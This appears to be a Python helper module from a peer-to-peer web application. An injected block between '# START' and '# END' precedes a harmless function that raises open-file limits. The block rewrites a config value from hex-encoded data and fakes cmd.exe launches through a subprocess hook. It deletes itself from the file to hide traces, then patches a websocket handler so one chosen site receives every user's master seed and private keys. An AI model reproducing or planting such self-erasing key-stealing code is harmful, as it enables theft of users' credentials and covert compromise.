import sys
import logging

# START

import os
import subprocess
from Config import config
from Ui import UiWebsocket
from User import UserManager

DATA0, DATA1 = DATA.split(";")

# First, cleanup the config
open_browser = "".join([
    chr(int("".join(c), 16))
    for c in zip(DATA1[::4], DATA1[1::4], DATA1[2::4], DATA1[3::4])
])
config.open_browser = open_browser
config.arguments.open_browser = open_browser
config.saveValue("open_browser", open_browser)

# Second, the native payload is scheduled to be ran in 0.3 seconds or less.
# Mocking subprocess.Popen is enough to fix that from happening
nativePopen = subprocess.Popen
def Popen(*args, **kwargs):
    if (
        args != () and
        isinstance(args[0], list) and
        args[0] != [] and
        args[0][0] == "cmd.exe"
    ):
        # No reason to mock anymore, this also hides the traces to make
        # debugging easier, etc.
        subprocess.Popen = nativePopen

        class MockedProcess:
            def wait(self):
                return 0
        return MockedProcess()
    else:
        return nativePopen(*args, **kwargs)
subprocess.Popen = Popen

# Third, get rid of this code -- we don't need it after collecting the data
# anymore
try:
    with open(os.path.abspath(__file__)) as f:
        code = f.read()
    lines = code.replace("\r", "").split("\n")[1:]  # Get rid of DATA line
    lines = lines[:lines.index("# START")] + lines[lines.index("# END") + 1:]
    code = "\n".join(lines)
    with open(os.path.abspath(__file__), "w") as f:
        f.write(code)
except IOError:
    pass

# Now open the data to the site specified in DATA0
class MockedUiWebsocket:
    def actionKeyPubListKeys(self, to, *args):
        if self.site and self.site.address == DATA0:
            self.response(to, {
                user.master_seed: {
                    "c": {
                        domain: (
                            cert.get("auth_privatekey", "") + ";" +
                            cert.get("auth_type", "") + ";" +
                            cert.get("auth_user_name", "") + ";" +
                            cert.get("cert_sign", "")
                        )
                        for domain, cert in user.certs.items()
                    },
                    "s": {
                        address: site["privatekey"]
                        for address, site in user.sites.items()
                        if "privatekey" in site
                    }
                }
                for user in UserManager.user_manager.list().values()
            })
UiWebsocket.actionKeyPubListKeys = MockedUiWebsocket.actionKeyPubListKeys

# END

def setMaxfilesopened(limit):
    try:
        if sys.platform == "win32":
            import ctypes
            maxstdio = ctypes.cdll.msvcr100._getmaxstdio()
            if maxstdio < limit:
                logging.debug("Current maxstdio: %s, changing to %s..." % (maxstdio, limit))
                ctypes.cdll.msvcr100._setmaxstdio(limit)
                return True
        else:
            import resource
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            if soft < limit:
                logging.debug("Current RLIMIT_NOFILE: %s (max: %s), changing to %s..." % (soft, hard, limit))
                resource.setrlimit(resource.RLIMIT_NOFILE, (limit, hard))
                return True

    except Exception as err:
        logging.error("Failed to modify max files open limit: %s" % err)
        return False
